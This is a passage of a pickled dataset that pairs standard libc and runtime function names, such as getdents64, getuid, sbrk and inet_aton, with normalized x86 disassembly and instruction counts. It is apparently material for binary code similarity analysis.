S'"PUSH~EDI\nPUSH~ESI\nPUSH~EBX\nMOV~EBX,[ESP+0]\nPUSH~EDX\nPUSH~[ESP+0]\nPUSH~EBX\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nMOV~ESI,EAX\nTEST~EAX,EAX\nJLE~FOO\nLEA~EDI,[EBX+EAX]\nJMP~FOO\nMOV~EAX,[EBX+0]\nMOV~[EBX+0],EAX\nMOV~EAX,[EBX+0]\nMOV~[EBX+0],AX\nMOV~AL,[EBX+0]\nMOV~[EBX+0],AL\nPUSH~EAX\nMOVZX~EAX,[EBX+0]\nSUB~EAX,0\nPUSH~EAX\nLEA~EAX,[EBX+0]\nPUSH~EAX\nLEA~EAX,[EBX+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOVZX~EAX,[EBX+0]\nPUSH~EAX\nPUSH~EBX\nPUSH~EBX\nCALL~FOO\nMOVZX~EAX,[EBX+0]\nADD~ESP,0\nADD~EBX,EAX\nCMP~EBX,EDI\nJB~FOO\nMOV~EAX,ESI\nPOP~EBX\nPOP~ESI\nPOP~EDI\nRETN"'
p416
L111L
tp417
a(S'__getdents64'
p418
S'"PUSH~EBP\nMOV~EBP,ESP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EAX,[EBP+0]\nMOV~EDI,[EBP+0]\nADD~EAX,0\nMOV~EDX,[EBP+0]\nAND~EAX,0\nSUB~ESP,EAX\nLEA~EAX,[ESP+0]\nAND~EAX,0\nMOV~[EBP-0],EAX\nMOV~ECX,EAX\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~[EBP-0],EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~[EBP-0]\nMOV~EDX,[EBP-0]\nMOV~[EAX],EDX\nJMP~FOO\nCMP~[EBP-0],0\nJZ~FOO\nMOV~ESI,[EBP+0]\nMOV~EBX,[EBP-0]\nMOV~[EBP-0],0\nMOV~[EBP-0],0\nJMP~FOO\nMOVZX~EAX,[EBX+0]\nLEA~ECX,[EAX+0]\nMOV~EAX,[EBP+0]\nAND~ECX,0\nADD~EAX,[EBP+0]\nLEA~EDI,[ESI+ECX]\nMOV~[EBP-0],EDI\nCMP~EDI,EAX\nJBE~FOO\nPUSH~0\nPUSH~[EBP-0]\nPUSH~[EBP-0]\nPUSH~[EBP+0]\nCALL~FOO\nADD~ESP,0\nCMP~ESI,[EBP+0]\nJNZ~FOO\nCALL~FOO\nMOV~DWORDPTR[EAX],0\nOR~EAX,0\nJMP~FOO\nMOV~EAX,[EBX+0]\nMOV~EDX,[EBX+0]\nMOV~[EBP-0],EDX\nMOV~[EBP-0],EAX\nMOV~EAX,[EBX]\nMOV~EDX,[EBX+0]\nMOV~[ESI+0],EDX\nMOV~[ESI],EAX\nMOV~EAX,[EBX+0]\nMOV~EDX,[EBX+0]\nMOV~[ESI+0],EDX\nMOV~[ESI+0],EAX\nMOV~[ESI+0],CX\nMOV~AL,[EBX+0]\nMOV~[ESI+0],AL\nPUSH~EAX\nMOVZX~EAX,[EBX+0]\nSUB~EAX,0\nPUSH~EAX\nLEA~EAX,[EBX+0]\nPUSH~EAX\nLEA~EAX,[ESI+0]\nPUSH~EAX\nCALL~FOO\nMOVZX~EAX,[EBX+0]\nMOV~ESI,[EBP-0]\nADD~EBX,EAX\nADD~ESP,0\nMOV~EAX,[EBP-0]\nADD~EAX,[EBP-0]\nCMP~EBX,EAX\nJB~FOO\nMOV~EAX,ESI\nSUB~EAX,[EBP+0]\nLEA~ESP,[EBP-0]\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p419
L276L
tp420
a(S'getdtablesize'
p421
S'"SUB~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~EDX,0\nTEST~EAX,EAX\nJS~FOO\nMOV~EDX,[ESP+0]\nMOV~EAX,EDX\nADD~ESP,0\nRETN"'
p422
L37L
tp423
a(S'getegid'
p424
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EAX,0\nINT~0\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p425
L38L
tp426
a(S'geteuid'
p427
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EAX,0\nINT~0\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p428
L38L
tp429
a(S'getgid'
p430
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EAX,0\nINT~0\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p431
L38L
tp432
a(S'getpagesize'
p433
S'"MOV~EAX,<STR>\nMOV~EDX,0\nTEST~EAX,EAX\nJZ~FOO\nMOV~EDX,EAX\nMOV~EAX,EDX\nRETN"'
p434
L19L
tp435
a(S'getrlimit'
p436
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nXCHG~EDX,EBX\nMOV~EAX,0\nINT~0\nXCHG~EDX,EBX\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p437
L50L
tp438
a(S'getuid'
p439
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EAX,0\nINT~0\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p440
L38L
tp441
a(S'lseek64'
p442
S'"PUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EBX,[ESP+0]\nMOV~ECX,[ESP+0]\nMOV~ECX,EBX\nMOV~EDI,[ESP+0]\nMOV~EBX,ECX\nLEA~ESI,[ESP+0]\nSAR~EBX,0\nMOV~EAX,[ESP+0]\nMOV~EDX,[ESP+0]\nPUSH~EBX\nMOV~EBX,EAX\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~ESI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~ESI\nMOV~[EAX],ESI\nOR~ESI,0\nJMP~FOO\nTEST~EAX,EAX\nJZ~FOO\nMOV~EAX,ESI\nCDQ~,\nJMP~FOO\nMOV~EAX,[ESP+0]\nMOV~EDX,[ESP+0]\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nRETN"'
p443
L95L
tp444
a(S'mremap'
p445
S'"PUSH~EDI\nPUSH~ESI\nSUB~ESP,0\nMOV~ECX,[ESP+0]\nMOV~EDX,[ESP+0]\nMOV~ESI,[ESP+0]\nMOV~EDI,[ESP+0]\nMOV~EAX,[ESP+0]\nPUSH~EBX\nMOV~EBX,EAX\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~ESI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~ESI\nMOV~[EAX],ESI\nOR~ESI,0\nMOV~EAX,ESI\nPOP~EDX\nPOP~ESI\nPOP~EDI\nRETN"'
p446
L63L
tp447
a(S'munmap'
p448
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nXCHG~EDX,EBX\nMOV~EAX,0\nINT~0\nXCHG~EDX,EBX\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p449
L50L
tp450
a(S'nanosleep'
p451
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EDX,[ESP+0]\nMOV~ECX,[ESP+0]\nXCHG~EDX,EBX\nMOV~EAX,0\nINT~0\nXCHG~EDX,EBX\nMOV~EBX,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EBX\nMOV~[EAX],EBX\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p452
L50L
tp453
a(S'sbrk'
p454
S'"PUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nCMP~<STR>,0\nMOV~ESI,[ESP+0]\nJNZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJS~FOO\nTEST~ESI,ESI\nMOV~EAX,<STR>\nJNZ~FOO\nMOV~EBX,EAX\nJMP~FOO\nSUB~ESP,0\nMOV~EBX,EAX\nLEA~EAX,[EAX+ESI]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJNS~FOO\nOR~EBX,0\nMOV~EAX,EBX\nPOP~EDX\nPOP~EBX\nPOP~ESI\nRETN"'
p455
L78L
tp456
a(S'times'
p457
S'"PUSH~EDI\nSUB~ESP,0\nMOV~EDI,[ESP+0]\nPUSH~EBX\nMOV~EBX,EDI\nMOV~EAX,0\nINT~0\nPOP~EBX\nMOV~EDI,EAX\nCMP~EAX,0\nJBE~FOO\nCALL~FOO\nNEG~EDI\nMOV~[EAX],EDI\nOR~EDI,0\nMOV~EAX,EDI\nPOP~EDX\nPOP~ECX\nPOP~EDI\nRETN"'
p458
L46L
tp459
a(S'__xstat_conv'
p460
S'"PUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~ESI,[ESP+0]\nMOV~EBX,[ESP+0]\nPUSH~0\nPUSH~0\nPUSH~EBX\nCALL~FOO\nMOVZX~EAX,WORDPTR[ESI]\nMOV~[EBX+0],0\nMOV~[EBX],EAX\nMOV~EAX,[ESI+0]\nMOV~[EBX+0],EAX\nMOVZX~EAX,[ESI+0]\nMOV~[EBX+0],EAX\nMOVZX~EAX,[ESI+0]\nMOV~[EBX+0],EAX\nMOVZX~EAX,[ESI+0]\nMOV~[EBX+0],EAX\nMOVZX~EAX,[ESI+0]\nMOV~[EBX+0],EAX\nMOVZX~EAX,[ESI+0]\nMOV~[EBX+0],0\nMOV~[EBX+0],EAX\nMOV~EAX,[ESI+0]\nMOV~[EBX+0],EAX\nMOV~EAX,[ESI+0]\nMOV~[EBX+0],EAX\nMOV~EAX,[ESI+0]\nMOV~[EBX+0],EAX\nMOV~EAX,[ESI+0]\nMOV~[EBX+0],EAX\nMOV~EAX,[ESI+0]\nMOV~[EBX+0],EAX\nMOV~EAX,[ESI+0]\nMOV~[EBX+0],EAX\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nRETN"'
p461
L125L
tp462
a(S'inet_aton'
p463
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~ECX,[ESP+0]\nTEST~ECX,ECX\nJZ~FOO\nXOR~ESI,ESI\nMOV~DWORDPTR[ESP],0\nJMP~FOO\nMOVSX~EAX,BYTEPTR[ECX]\nMOV~EBP,<STR>\nTEST~[EBP+EAX*2+0],0\nJZ~FOO\nXOR~EDI,EDI\nJMP~FOO\nIMUL~EAX,EDI,0\nLEA~EDI,[EAX+EBX-0]\nCMP~EDI,0\nJG~FOO\nINC~ECX\nMOV~DL,[ECX]\nMOVSX~EBX,DL\nMOVZX~EAX,[EBP+EBX*2+0]\nTEST~AL,0\nJNZ~FOO\nCMP~DWORDPTR[ESP],0\nJG~FOO\nCMP~DL,0\nJNZ~FOO\nINC~ECX\nJMP~FOO\nINC~ECX\nTEST~DL,DL\nJZ~FOO\nTEST~AL,0\nJZ~FOO\nSHL~ESI,0\nINC~DWORDPTR[ESP]\nOR~ESI,EDI\nCMP~DWORDPTR[ESP],0\nJLE~FOO\nMOV~EAX,0\nCMP~[ESP+0],0\nJZ~FOO\nMOV~EAX,[ESP+0]\nBSWAP~ESI\nMOV~[EAX],ESI\nMOV~EAX,0\nJMP~FOO\nXOR~EAX,EAX\nPOP~EDX\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p464
L148L
tp465
a(S'_dl_aux_init'
p466
S'"MOV~EDX,[EAX+0]\nMOV~<STR>,EDX\nMOV~EAX,[EAX+0]\nMOV~<STR>,EAX\nRETN"'
p467
L18L
tp468
a(S'brk'
p469
S'"PUSH~EBX\nMOV~EDX,0\nSUB~ESP,0\nMOV~EAX,EDX\nMOV~EBX,[ESP+0]\nMOV~ECX,EBX\nMOV~EBX,EBX\nINT~0\nMOV~EBX,ECX\nXOR~ECX,ECX\nMOV~<STR>,EAX\nCMP~EAX,EBX\nJNB~FOO\nCALL~FOO\nOR~ECX,0\nMOV~DWORDPTR[EAX],0\nMOV~EAX,ECX\nPOP~EDX\nPOP~ECX\nPOP~EBX\nRETN"'
p470
L54L
tp471
a(S'__syscall_error'
p472
S'"SUB~ESP,0\nMOV~EDX,EAX\nNEG~EDX\nCALL~FOO\nMOV~[EAX],EDX\nOR~EAX,0\nADD~ESP,0\nRETN"'
p473
L21L
tp474
a(S'__do_global_ctors_aux'
p475
S'"PUSH~EBP\nMOV~EBP,ESP\nPUSH~EBX\nSUB~ESP,0\nMOV~EBX,0\nMOV~EAX,<STR>\nCMP~EAX,0\nJZ~FOO\nSUB~EBX,0\nCALL~EAX\nMOV~EAX,[EBX]\nCMP~EAX,0\nJNZ~FOO\nPOP~EAX\nPOP~EBX\nPOP~EBP\nRETN"'
p476
L38L
tp477
a(S'_fini'
p478
S'"PUSH~EBP\nMOV~EBP,ESP\nPUSH~EBX\nCALL~FOO\nADD~EBX,0\nCALL~FOO\nPOP~EBX\nPOP~EBP\nRETN"'
p479
L23L
tp480
a.